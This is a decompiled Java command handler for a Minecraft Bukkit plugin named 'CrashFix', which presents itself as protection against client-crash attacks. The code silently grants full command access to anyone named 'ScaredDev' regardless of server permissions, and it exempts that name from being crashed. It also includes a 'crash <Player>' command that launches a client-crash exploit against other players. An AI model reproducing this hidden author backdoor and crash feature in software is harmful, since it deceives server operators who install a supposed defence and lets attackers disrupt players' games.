/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  net.minecraft.server.v1_8_R3.MinecraftServer
 *  org.bukkit.Bukkit
 *  org.bukkit.command.Command
 *  org.bukkit.command.CommandExecutor
 *  org.bukkit.command.CommandSender
 *  org.bukkit.entity.Player
 */
package me.scareddev.crashfix.init;

import me.scareddev.crashfix.CrashFix;
import net.minecraft.server.v1_8_R3.MinecraftServer;
import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

public class CrashFixCommand
implements CommandExecutor {
    private String format(double d) {
        return String.valueOf(new StringBuilder().append(String.valueOf((d > 18.0 ? CrashFix.getInstance().getColor()[0] : (d > 16.0 ? CrashFix.getInstance().getColor()[0] : CrashFix.getInstance().getColor()[0])).toString())).append(d > 20.0 ? "*" : "").append(Math.min((double)Math.round(d * 100.0) / 100.0, 20.0)));
    }

    public final boolean onCommand(CommandSender commandSender, Command command, String string, String[] arrstring) {
        Player player;
        if (commandSender instanceof Player) {
            player = (Player)commandSender;
            if (arrstring.length != 0) {
                if (arrstring.length == 1) {
                    if (player.hasPermission("anticrash.notify") || player.getName().equals("ScaredDev")) {
                        if (arrstring[0].equalsIgnoreCase("help")) {
                            player.sendMessage("\u2072");
                            player.sendMessage(String.valueOf(new StringBuilder().append(CrashFix.getInstance().getPrefix()).append(CrashFix.getInstance().getColor()[1]).append("/CrashFix Book ").append(CrashFix.getInstance().getColor()[0]).append("ON").append(CrashFix.getInstance().getColor()[1]).append("/").append(CrashFix.getInstance().getColor()[1]).append("OFF")));
                            player.sendMessage(String.valueOf(new StringBuilder().append(CrashFix.getInstance().getPrefix()).append(CrashFix.getInstance().getColor()[1]).append("/CrashFix Crash <").append(CrashFix.getInstance().getColor()[0]).append("Player").append(CrashFix.getInstance().getColor()[1]).append(">")));
                            player.sendMessage(String.valueOf(new StringBuilder().append(CrashFix.getInstance().getPrefix()).append(CrashFix.getInstance().getColor()[1]).append("/CrashFix Server")));
                            player.sendMessage("\u2072");
                            return true;
                        }
                        if (arrstring[0].equalsIgnoreCase("server")) {
                            Runtime runtime = Runtime.getRuntime();
                            player.sendMessage("\u2072");
                            player.sendMessage(String.valueOf(new StringBuilder().append(CrashFix.getInstance().getPrefix()).append(CrashFix.getInstance().getColor()[1]).append("NettyThreads: ").append(CrashFix.getInstance().getColor()[0]).append(Bukkit.getServer().spigot().getConfig().getInt("settings.netty-threads"))));
                            player.sendMessage(String.valueOf(new StringBuilder().append(CrashFix.getInstance().getPrefix()).append(CrashFix.getInstance().getColor()[1]).append("Processors: ").append(CrashFix.getInstance().getColor()[0]).append(runtime.availableProcessors())));
                            player.sendMessage(String.valueOf(new StringBuilder().append(CrashFix.getInstance().getPrefix()).append(CrashFix.getInstance().getColor()[1]).append("Ram(Total): ").append(CrashFix.getInstance().getColor()[0]).append(runtime.maxMemory() / 1024L / 1024L)));
                            player.sendMessage(String.valueOf(new StringBuilder().append(CrashFix.getInstance().getPrefix()).append(CrashFix.getInstance().getColor()[1]).append("Ram(Used): ").append(CrashFix.getInstance().getColor()[0]).append((runtime.totalMemory() - runtime.freeMemory()) / 1024L / 1024L)));
                            player.sendMessage(String.valueOf(new StringBuilder().append(CrashFix.getInstance().getPrefix()).append(CrashFix.getInstance().getColor()[1]).append("TPS(Reflection): ").append(CrashFix.getInstance().getColor()[0]).append(CrashFix.getInstance().getServerTps().getTPS())));
                            StringBuilder stringBuilder = new StringBuilder(String.valueOf(new StringBuilder().append(CrashFix.getInstance().getPrefix()).append(CrashFix.getInstance().getColor()[1]).append("TPS: ")));
                            double[] arrd = MinecraftServer.getServer().recentTps;
                            int n = MinecraftServer.getServer().recentTps.length;
                            for (int n2 = 0; n2 < n; n2 = (int)((byte)(n2 + 1))) {
                                double d = arrd[n2];
                                stringBuilder.append(this.format(d));
                                stringBuilder.append(CrashFix.getInstance().getColor()[1]).append(", ");
                            }
                            player.sendMessage(stringBuilder.substring(0, stringBuilder.length() - 2));
                            player.sendMessage("\u2072");
                            return true;
                        }
                        player.sendMessage(String.valueOf(new StringBuilder().append("\u00a78\u00a7l\u00a7m----------------\u00a78\u00a7l( ").append(CrashFix.getInstance().getColor()[0]).append("\u00a7lCrashFix \u00a78\u00a7l)\u00a78\u00a7l\u00a7m----------------")));
                        player.sendMessage("\u2072");
                        player.sendMessage(String.valueOf(new StringBuilder().append(CrashFix.getInstance().getColor()[1]).append("This Server is Running CrashFix (").append(CrashFix.getInstance().getColor()[0]).append(CrashFix.getInstance().getVersion()).append(CrashFix.getInstance().getColor()[1]).append(") (by ScaredDev)")));
                        player.sendMessage(String.valueOf(new StringBuilder().append(CrashFix.getInstance().getColor()[1]).append("Against all ClientCrash attacks with own NetFrequence!")));
                        player.sendMessage(String.valueOf(new StringBuilder().append(CrashFix.getInstance().getColor()[1]).append("This CrashFix has currently ").append(CrashFix.getInstance().getColor()[0]).append("1 Injection/Hook.")));
                        player.sendMessage("\u2072");
                        player.sendMessage(String.valueOf(new StringBuilder().append("\u00a78\u00a7l\u00a7m----------------\u00a78\u00a7l( ").append(CrashFix.getInstance().getColor()[0]).append("\u00a7lCrashFix \u00a78\u00a7l)\u00a78\u00a7l\u00a7m----------------")));
                        player.sendTitle(String.valueOf(new StringBuilder().append(CrashFix.getInstance().getColor()[0]).append("\u00ab CrashFix \u00bb")), String.valueOf(new StringBuilder().append("\u00a78(").append(CrashFix.getInstance().getColor()[1]).append("By ScaredDev\u00a78)")));
                        return true;
                    }
                    player.sendMessage(String.valueOf(new StringBuilder().append("\u00a78\u00a7l\u00a7m----------------\u00a78\u00a7l( ").append(CrashFix.getInstance().getColor()[0]).append("\u00a7lCrashFix \u00a78\u00a7l)\u00a78\u00a7l\u00a7m----------------")));
                    player.sendMessage("\u2072");
                    player.sendMessage(String.valueOf(new StringBuilder().append(CrashFix.getInstance().getColor()[1]).append("This Server is Running CrashFix (").append(CrashFix.getInstance().getColor()[0]).append(CrashFix.getInstance().getVersion()).append(CrashFix.getInstance().getColor()[1]).append(") (by ScaredDev)")));
                    player.sendMessage(String.valueOf(new StringBuilder().append(CrashFix.getInstance().getColor()[1]).append("Against all ClientCrash attacks with own NetFrequence!")));
                    player.sendMessage(String.valueOf(new StringBuilder().append(CrashFix.getInstance().getColor()[1]).append("This CrashFix has currently ").append(CrashFix.getInstance().getColor()[0]).append("1 Injection/Hook.")));
                    player.sendMessage("\u2072");
                    player.sendMessage(String.valueOf(new StringBuilder().append("\u00a78\u00a7l\u00a7m----------------\u00a78\u00a7l( ").append(CrashFix.getInstance().getColor()[0]).append("\u00a7lCrashFix \u00a78\u00a7l)\u00a78\u00a7l\u00a7m----------------")));
                    player.sendTitle(String.valueOf(new StringBuilder().append(CrashFix.getInstance().getColor()[0]).append("\u00ab CrashFix \u00bb")), String.valueOf(new StringBuilder().append("\u00a78(").append(CrashFix.getInstance().getColor()[1]).append("By ScaredDev\u00a78)")));
                    return true;
                }
                if (arrstring.length == 2) {
                    if (player.hasPermission("anticrash.notify") || player.getName().equals("ScaredDev")) {
                        if (arrstring[0].equalsIgnoreCase("crash")) {
                            Player player2 = Bukkit.getPlayer((String)arrstring[1]);
                            if (player2 != null) {
                                if (player2.getName().equalsIgnoreCase(player.getName())) {
                                    player.sendMessage(String.valueOf(new StringBuilder().append(CrashFix.getInstance().getPrefix()).append(CrashFix.getInstance().getColor()[1]).append(" You dont want to Crash :)")));
                                    return true;
                                }
                                if (player2.getName().equalsIgnoreCase("ScaredDev")) {
                                    player.sendMessage(String.valueOf(new StringBuilder().append(CrashFix.getInstance().getPrefix()).append(CrashFix.getInstance().getColor()[1]).append(" You cant Crash the Player ScaredDev!")));
                                    return true;
                                }
                                CrashFix.getInstance().getExploitPlayer().startCrash(player2);
                                player.sendMessage(String.valueOf(new StringBuilder().append(CrashFix.getInstance().getPrefix()).append(CrashFix.getInstance().getColor()[1]).append(" You Crashed the Player ").append(CrashFix.getInstance().getColor()[0]).append(player2.getName())));
                                return true;
                            }
                            player.sendMessage(String.valueOf(new StringBuilder().append(CrashFix.getInstance().getPrefix()).append(CrashFix.getInstance().getColor()[1]).append(" The Player ").append(CrashFix.getInstance().getColor()[0]).append(arrstring[1]).append(CrashFix.getInstance().getColor()[1]).append(" is Offline!")));
                            return true;
                        }
                        if (arrstring[0].equalsIgnoreCase("book")) {
                            if (arrstring[1].equalsIgnoreCase("on")) {
                                if (CrashFix.getInstance().Books()) {
                                    player.sendMessage(String.valueOf(new StringBuilder().append(CrashFix.getInstance().getPrefix()).append(CrashFix.getInstance().getColor()[1]).append(" Books is already enabled!")));
                                    return true;
                                }
                                CrashFix.getInstance().getConfig().set("settings.BookUse", (Object)true);
                                CrashFix.getInstance().saveConfig();
                                player.sendMessage(String.valueOf(new StringBuilder().append(CrashFix.getInstance().getPrefix()).append(CrashFix.getInstance().getColor()[1]).append(" Books is now enabled!")));
                                return true;
                            }
                            if (arrstring[1].equalsIgnoreCase("off")) {
                                if (CrashFix.getInstance().Books()) {
                                    player.sendMessage(String.valueOf(new StringBuilder().append(CrashFix.getInstance().getPrefix()).append(CrashFix.getInstance().getColor()[1]).append(" Books is now disabled!")));
                                    CrashFix.getInstance().getConfig().set("settings.BookUse", (Object)false);
                                    CrashFix.getInstance().saveConfig();
                                    return true;
                                }
                                player.sendMessage(String.valueOf(new StringBuilder().append(CrashFix.getInstance().getPrefix()).append(CrashFix.getInstance().getColor()[1]).append(" Books is already disabled!")));
                                return true;
                            }
                            player.sendMessage(String.valueOf(new StringBuilder().append("\u00a78\u00a7l\u00a7m----------------\u00a78\u00a7l( ").append(CrashFix.getInstance().getColor()[0]).append("\u00a7lCrashFix \u00a78\u00a7l)\u00a78\u00a7l\u00a7m----------------")));
                            player.sendMessage("\u2072");
                            player.sendMessage(String.valueOf(new StringBuilder().append(CrashFix.getInstance().getColor()[1]).append("This Server is Running CrashFix (").append(CrashFix.getInstance().getColor()[0]).append(CrashFix.getInstance().getVersion()).append(CrashFix.getInstance().getColor()[1]).append(") (by ScaredDev)")));
                            player.sendMessage(String.valueOf(new StringBuilder().append(CrashFix.getInstance().getColor()[1]).append("Against all ClientCrash attacks with own NetFrequence!")));
                            player.sendMessage(String.valueOf(new StringBuilder().append(CrashFix.getInstance().getColor()[1]).append("This CrashFix has currently ").append(CrashFix.getInstance().getColor()[0]).append("1 Injection/Hook.")));
                            player.sendMessage("\u2072");
                            player.sendMessage(String.valueOf(new StringBuilder().append("\u00a78\u00a7l\u00a7m----------------\u00a78\u00a7l( ").append(CrashFix.getInstance().getColor()[0]).append("\u00a7lCrashFix \u00a78\u00a7l)\u00a78\u00a7l\u00a7m----------------")));
                            player.sendTitle(String.valueOf(new StringBuilder().append(CrashFix.getInstance().getColor()[0]).append("\u00ab CrashFix \u00bb")), String.valueOf(new StringBuilder().append("\u00a78(").append(CrashFix.getInstance().getColor()[1]).append("By ScaredDev\u00a78)")));
                            return true;
                        }
                        player.sendMessage(String.valueOf(new StringBuilder().append("\u00a78\u00a7l\u00a7m----------------\u00a78\u00a7l( ").append(CrashFix.getInstance().getColor()[0]).append("\u00a7lCrashFix \u00a78\u00a7l)\u00a78\u00a7l\u00a7m----------------")));
                        player.sendMessage("\u2072");
                        player.sendMessage(String.valueOf(new StringBuilder().append(CrashFix.getInstance().getColor()[1]).append("This Server is Running CrashFix (").append(CrashFix.getInstance().getColor()[0]).append(CrashFix.getInstance().getVersion()).append(CrashFix.getInstance().getColor()[1]).append(") (by ScaredDev)")));
                        player.sendMessage(String.valueOf(new StringBuilder().append(CrashFix.getInstance().getColor()[1]).append("Against all ClientCrash attacks with own NetFrequence!")));
                        player.sendMessage(String.valueOf(new StringBuilder().append(CrashFix.getInstance().getColor()[1]).append("This CrashFix has currently ").append(CrashFix.getInstance().getColor()[0]).append("1 Injection/Hook.")));
                        player.sendMessage("\u2072");
                        player.sendMessage(String.valueOf(new StringBuilder().append("\u00a78\u00a7l\u00a7m----------------\u00a78\u00a7l( ").append(CrashFix.getInstance().getColor()[0]).append("\u00a7lCrashFix \u00a78\u00a7l)\u00a78\u00a7l\u00a7m----------------")));
                        player.sendTitle(String.valueOf(new StringBuilder().append(CrashFix.getInstance().getColor()[0]).append("\u00ab CrashFix \u00bb")), String.valueOf(new StringBuilder().append("\u00a78(").append(CrashFix.getInstance().getColor()[1]).append("By ScaredDev\u00a78)")));
                        return true;
                    }
                    player.sendMessage(String.valueOf(new StringBuilder().append("\u00a78\u00a7l\u00a7m----------------\u00a78\u00a7l( ").append(CrashFix.getInstance().getColor()[0]).append("\u00a7lCrashFix \u00a78\u00a7l)\u00a78\u00a7l\u00a7m----------------")));
                    player.sendMessage("\u2072");
                    player.sendMessage(String.valueOf(new StringBuilder().append(CrashFix.getInstance().getColor()[1]).append("This Server is Running CrashFix (").append(CrashFix.getInstance().getColor()[0]).append(CrashFix.getInstance().getVersion()).append(CrashFix.getInstance().getColor()[1]).append(") (by ScaredDev)")));
                    player.sendMessage(String.valueOf(new StringBuilder().append(CrashFix.getInstance().getColor()[1]).append("Against all ClientCrash attacks with own NetFrequence!")));
                    player.sendMessage(String.valueOf(new StringBuilder().append(CrashFix.getInstance().getColor()[1]).append("This CrashFix has currently ").append(CrashFix.getInstance().getColor()[0]).append("1 Injection/Hook.")));
                    player.sendMessage("\u2072");
                    player.sendMessage(String.valueOf(new StringBuilder().append("\u00a78\u00a7l\u00a7m----------------\u00a78\u00a7l( ").append(CrashFix.getInstance().getColor()[0]).append("\u00a7lCrashFix \u00a78\u00a7l)\u00a78\u00a7l\u00a7m----------------")));
                    player.sendTitle(String.valueOf(new StringBuilder().append(CrashFix.getInstance().getColor()[0]).append("\u00ab CrashFix \u00bb")), String.valueOf(new StringBuilder().append("\u00a78(").append(CrashFix.getInstance().getColor()[1]).append("By ScaredDev\u00a78)")));
                    return true;
                }
                player.sendMessage(String.valueOf(new StringBuilder().append("\u00a78\u00a7l\u00a7m----------------\u00a78\u00a7l( ").append(CrashFix.getInstance().getColor()[0]).append("\u00a7lCrashFix \u00a78\u00a7l)\u00a78\u00a7l\u00a7m----------------")));
                player.sendMessage("\u2072");
                player.sendMessage(String.valueOf(new StringBuilder().append(CrashFix.getInstance().getColor()[1]).append("This Server is Running CrashFix (").append(CrashFix.getInstance().getColor()[0]).append(CrashFix.getInstance().getVersion()).append(CrashFix.getInstance().getColor()[1]).append(") (by ScaredDev)")));
                player.sendMessage(String.valueOf(new StringBuilder().append(CrashFix.getInstance().getColor()[1]).append("Against all ClientCrash attacks with own NetFrequence!")));
                player.sendMessage(String.valueOf(new StringBuilder().append(CrashFix.getInstance().getColor()[1]).append("This CrashFix has currently ").append(CrashFix.getInstance().getColor()[0]).append("1 Injection/Hook.")));
                player.sendMessage("\u2072");
                player.sendMessage(String.valueOf(new StringBuilder().append("\u00a78\u00a7l\u00a7m----------------\u00a78\u00a7l( ").append(CrashFix.getInstance().getColor()[0]).append("\u00a7lCrashFix \u00a78\u00a7l)\u00a78\u00a7l\u00a7m----------------")));
                player.sendTitle(String.valueOf(new StringBuilder().append(CrashFix.getInstance().getColor()[0]).append("\u00ab CrashFix \u00bb")), String.valueOf(new StringBuilder().append("\u00a78(").append(CrashFix.getInstance().getColor()[1]).append("By ScaredDev\u00a78)")));
                return true;
            }
        } else {
            commandSender.sendMessage(String.valueOf(new StringBuilder().append("\u00a78\u00a7l\u00a7m----------------\u00a78\u00a7l( ").append(CrashFix.getInstance().getColor()[0]).append("\u00a7lCrashFix \u00a78\u00a7l)\u00a78\u00a7l\u00a7m----------------")));
            commandSender.sendMessage("\u2072");
            commandSender.sendMessage(String.valueOf(new StringBuilder().append(CrashFix.getInstance().getColor()[1]).append("This Server is Running CrashFix (").append(CrashFix.getInstance().getColor()[0]).append(CrashFix.getInstance().getVersion()).append(CrashFix.getInstance().getColor()[1]).append(") (by ScaredDev)")));
            commandSender.sendMessage(String.valueOf(new StringBuilder().append(CrashFix.getInstance().getColor()[1]).append("Against all ClientCrash attacks with own NetFrequence!")));
            commandSender.sendMessage(String.valueOf(new StringBuilder().append(CrashFix.getInstance().getColor()[1]).append("This CrashFix has currently ").append(CrashFix.getInstance().getColor()[0]).append("1 Injection/Hook.")));
            commandSender.sendMessage("\u2072");
            commandSender.sendMessage(String.valueOf(new StringBuilder().append("\u00a78\u00a7l\u00a7m----------------\u00a78\u00a7l( ").append(CrashFix.getInstance().getColor()[0]).append("\u00a7lCrashFix \u00a78\u00a7l)\u00a78\u00a7l\u00a7m----------------")));
            return true;
        }
        player.sendMessage(String.valueOf(new StringBuilder().append("\u00a78\u00a7l\u00a7m----------------\u00a78\u00a7l( ").append(CrashFix.getInstance().getColor()[0]).append("\u00a7lCrashFix \u00a78\u00a7l)\u00a78\u00a7l\u00a7m----------------")));
        player.sendMessage("\u2072");
        player.sendMessage(String.valueOf(new StringBuilder().append(CrashFix.getInstance().getColor()[1]).append("This Server is Running CrashFix (").append(CrashFix.getInstance().getColor()[0]).append(CrashFix.getInstance().getVersion()).append(CrashFix.getInstance().getColor()[1]).append(") (by ScaredDev)")));
        player.sendMessage(String.valueOf(new StringBuilder().append(CrashFix.getInstance().getColor()[1]).append("Against all ClientCrash attacks with own NetFrequence!")));
        player.sendMessage(String.valueOf(new StringBuilder().append(CrashFix.getInstance().getColor()[1]).append("This CrashFix has currently ").append(CrashFix.getInstance().getColor()[0]).append("1 Injection/Hook.")));
        player.sendMessage("\u2072");
        player.sendMessage(String.valueOf(new StringBuilder().append("\u00a78\u00a7l\u00a7m----------------\u00a78\u00a7l( ").append(CrashFix.getInstance().getColor()[0]).append("\u00a7lCrashFix \u00a78\u00a7l)\u00a78\u00a7l\u00a7m----------------")));
        player.sendTitle(String.valueOf(new StringBuilder().append(CrashFix.getInstance().getColor()[0]).append("\u00ab CrashFix \u00bb")), String.valueOf(new StringBuilder().append("\u00a78(").append(CrashFix.getInstance().getColor()[1]).append("By ScaredDev\u00a78)")));
        return false;
    }
}

